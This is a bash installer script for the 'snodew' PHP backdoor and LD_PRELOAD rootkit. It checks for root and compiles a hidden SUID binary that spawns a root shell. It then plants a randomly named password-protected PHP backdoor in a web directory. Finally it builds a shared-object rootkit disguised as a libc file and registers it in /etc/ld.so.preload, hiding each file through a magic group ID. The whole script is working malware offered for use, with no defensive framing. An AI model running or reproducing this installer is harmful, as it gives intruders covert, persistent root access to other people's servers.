#!/bin/bash

# change this if you need to.
WWWNAME="www-data"
#WWWNAME="http"
#WWWNAME="httpd"
SECRET_PORT=""

SNODEW_LOC="src/snodew.php"

[ -f .ascii ] && printf "\e[32m`cat .ascii`\e[0m" && echo

secho(){ echo -e " [\e[32m+\e[0m] $1"; }
eecho(){ echo -e " [\e[31m-\e[0m] $1"; }

[ -z $COMPILE_ONLY ] && [ `id -u` != 0 ] && { eecho "not root, exiting"; exit; }
[ ! -f "$SNODEW_LOC" ] && { eecho "$SNODEW_LOC not found, exiting"; exit; }
[ ! -f `which gcc 2>/dev/null || echo "no"` ] && { eecho "gcc not installed/found, exiting"; exit; }
[ -z $NO_ROOTKIT ] && [ -z "`cat /etc/passwd | grep $WWWNAME`" ] && { \
    eecho "no passwd entry for $WWWNAME"; \
    exit; \
}
usage(){
    echo " usage: $0 [install dir] [password]"
    exit
}
# usage: show_info [install dir] [hashed password] [suid bin location] [magic gid] [secret port]
show_info(){
    echo -e " [..] installation directory: \e[32m$1\e[0m"
    echo -e " [..] hashed password: $2"
    echo -e " [..] suid bin location: $3"
    echo -e " [..] magic gid: $4"
    echo -e " [..] secret port: \e[32m$5\e[0m"
}
random(){ echo -n "`cat /dev/urandom | tr -dc $1 | fold -w $2 | head -n 1`"; }
# usage: hash_password [password]
hash_password(){ echo -n "$(sed 's/.\{2\}$//' <<< $(echo `echo -n "$1" | md5sum`))"; }
# usage: hide_file [path]
hide_file(){
    [ -z $NO_ROOTKIT ] && chown 0:$MAGIC_GID $1 2>/dev/null;
}

get_userinfo(){ # $1 = username
    echo " [..] getting $1's information"
    WWWUID="`cat /etc/passwd | grep "$1" | awk -F: '{print $3}'`"
    WWWGID="`cat /etc/passwd | grep "$1" | awk -F: '{print $4}'`"
    WWWHOME="`cat /etc/passwd | grep "$1" | awk -F: '{print $6}'`"
}

# usage: setup_backdoor [suid bin location]
# compiles small program that runs /bin/sh after setting our gid to our magic gid.
# then hides it & gives it suid permissions.
setup_backdoor(){
    printf "#include <unistd.h>\nint main(){setuid(0);setgid($MAGIC_GID);execl(\"/bin/sh\",\"sh\",0);return 0;}" > bd.c

    echo " [..] compiling suid binary"
    gcc bd.c -o $1 || { eecho "couldn't compile binary"; exit; }
    rm bd.c

    [ -z $NO_ROOTKIT ] && secho "hiding compiled binary"
    hide_file $1

    secho "assigning suid bit to binary"
    chmod u+s $1 || { eecho "couldn't assign suid bit to $1"; exit; }
}

# usage:
# config_snodew [hashed password] [suid bin location] [install dir]
config_snodew(){
    secho "configuring snodew"
    cp $SNODEW_LOC ${SNODEW_LOC}.bak
    sed -i "s:_PASS_:$1:" $SNODEW_LOC
    sed -i "s:_SUID_BIN_:$2:" $SNODEW_LOC
    sed -i "s:_SECRET_PORT_:$SECRET_PORT:" $SNODEW_LOC

    PHP_NEWFILENAME="`random 'a-z' 6`.php"
    PHP_LOCATION="$3/$PHP_NEWFILENAME"
    [ -z $COMPILE_ONLY ] && echo " [+] moving and hiding snodew php script to specified directory"
    [ -z $COMPILE_ONLY ] && mv $SNODEW_LOC $PHP_LOCATION
    mv ${SNODEW_LOC}.bak $SNODEW_LOC
    hide_file $PHP_LOCATION

    secho "backdoor path: \e[32m$PHP_LOCATION\e[0m"
}

[ -z "$1" ] && usage; # install dir
[ -z "$2" ] && usage; # password
[ ! -d "$1" ] && { eecho "specified install directory doesn't exist"; exit; }

[ -z $SECRET_PORT ] && SECRET_PORT=`random '1-9' 4`

INSTALL_DIR="$1"
PASS="$(hash_password $2)"
SUID_BIN="/lib/init.`random '1-4' 1`"
MAGIC_GID=`random '1-9' 3`
MAGIC_VAR="`random 'A-Z' 7`"
show_info $INSTALL_DIR $PASS $SUID_BIN $MAGIC_GID $SECRET_PORT; echo

[ -z $COMPILE_ONLY ] && setup_backdoor $SUID_BIN
config_snodew $PASS $SUID_BIN $INSTALL_DIR

echo
[ ! -z $COMPILE_ONLY ] && secho "completed setting up snodew php backdoor"
[ ! -z $NO_ROOTKIT ] && exit  # IF THEY DON'T WANT ROOTKIT POWERS, END NOW!!11!


# SETUP ROOTKIT CONFIGURATION

echo " [..] configuring rootkit settings..."

CONF_H="src/config.h"     # copy file. keep original format.
cp $CONF_H ${CONF_H}.bak

SOPATH="/lib/libc.so.`random '1-9' 2`"
PRELOAD="/etc/ld.so.preload"
secho "magic variable: \e[32m$MAGIC_VAR\e[0m"
sed -i "s:_MAGIC_GID_:$MAGIC_GID:" $CONF_H
sed -i "s:_MAGIC_VAR_:$MAGIC_VAR:" $CONF_H
sed -i "s:_SUID_BIN_:$SUID_BIN:" $CONF_H
sed -i "s:_SECRET_PORT_:$SECRET_PORT:" $CONF_H
sed -i "s:_PHP_LOCATION_:$PHP_LOCATION:" $CONF_H
sed -i "s:_PHP_NEWFILENAME_:$PHP_NEWFILENAME:" $CONF_H
sed -i "s:_SOPATH_:$SOPATH:" $CONF_H
sed -i "s:_PRELOAD_:$PRELOAD:" $CONF_H

# write service user information
get_userinfo $WWWNAME
sed -i "s:_WWWUID_:$WWWUID:" $CONF_H
sed -i "s:_WWWGID_:$WWWGID:" $CONF_H
sed -i "s:_WWWNAME_:$WWWNAME:" $CONF_H
sed -i "s:_WWWHOME_:$WWWHOME:" $CONF_H

echo " [..] compiling snodew's rootkit"

gcc -std=gnu99 -O0 -g0 src/snodew2.c -Wall -fomit-frame-pointer -fPIC -shared -ldl -Wl,--build-id=none -o snodew2.so
rm $CONF_H && mv ${CONF_H}.bak $CONF_H
strip snodew2.so 2>/dev/null || { echo "couldn't strip snodew2.so, exiting"; exit; }
secho "compiled rootkit (snodew2.so - `ls -lhN snodew2.so | awk '{print $5}'`)"

[ ! -z $COMPILE_ONLY ] && exit


# INSTALL!

echo " [..] installing to $SOPATH and writing to $PRELOAD"
mv snodew2.so $SOPATH && hide_file $SOPATH
echo -n "$SOPATH" > $PRELOAD
hide_file $PRELOAD

secho "rootkit installation successful"
secho "restart the service asap"
